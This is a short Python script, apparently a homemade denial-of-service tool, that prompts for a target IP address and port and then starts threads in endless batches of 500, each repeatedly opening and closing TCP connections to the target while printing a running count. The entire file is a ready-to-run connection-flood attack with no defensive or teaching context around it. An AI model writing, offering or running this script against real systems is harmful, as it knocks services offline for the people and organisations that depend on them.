import socket
from threading import Thread

target = input("enter the target ip --->>") # enter your target ip  here
port = int(input("enter the port ---->>"))

attack_num = 0

def attack():
	while True:
	    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	    s.connect((target,port))
	    
	    global attack_num
	    attack_num +=1
	    print("number of connections send : " +" " + str(attack_num))
	    s.close()
	    
	    
while True:
    for i in range(500):
       thread = Thread(target=attack)
       thread.start()
    
